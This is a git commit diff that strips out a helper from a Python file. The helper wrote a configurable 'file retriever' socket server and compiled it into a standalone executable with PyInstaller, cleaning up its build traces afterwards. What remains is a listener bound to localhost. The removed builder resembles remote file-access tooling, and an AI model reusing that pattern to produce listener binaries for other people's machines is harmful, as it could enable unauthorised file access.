dafa68e5399cf2a2ff023b9a5a4e914cce31d945
Stian <79229317+0xStian@users.noreply.github.com>
2024-03-20 08:52:37 +0000

    fixes

--- actions_on_system/test.py
+++ actions_on_system/test.py
@@ -1,10 +1,3 @@
-import subprocess
-import sys
-import os
-import shutil
-
-def make_executable(output_directory, ipaddress, port, script_name, exe_name):
-    file_retriever_content = f'''
 import socket
 import os
 import json
@@ -45,7 +38,7 @@ def handle_client(conn):
             
 def main():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind(("{ipaddress}", {port}))
+        s.bind(("localhost", 8001))
         s.listen()
         print("Server listening...")
         while True:
@@ -54,36 +47,3 @@ def main():
                 print(f"Connected by {{addr}}")
                 handle_client(conn)
 main()
-    '''
-
-    with open(script_name, "w") as file:
-        file.write(file_retriever_content)
-
-    try:
-        if not os.path.exists(output_directory):
-            os.makedirs(output_directory)
-
-        subprocess.check_call([
-            sys.executable, '-m', 'PyInstaller',
-            '--onefile',  # single executable
-            '--noconfirm',  # Overwrite existing files
-            '--distpath', output_directory,  # output directory
-            script_name  # Name
-        ])
-        
-        # Cleanup
-        build_dir = "build"
-        spec_file = f"{exe_name}.spec"
-        script_file = f"{script_name}"
-        if os.path.exists(build_dir):
-            shutil.rmtree(build_dir)
-        if os.path.exists(spec_file):
-            os.remove(spec_file)
-        if os.path.exists(script_file):
-            os.remove(script_file)
-        
-
-        print(f"Executable created successfully in {output_directory}.")
-        
-    except subprocess.CalledProcessError as e:
-        print(f"Failed to create executable: {e}")
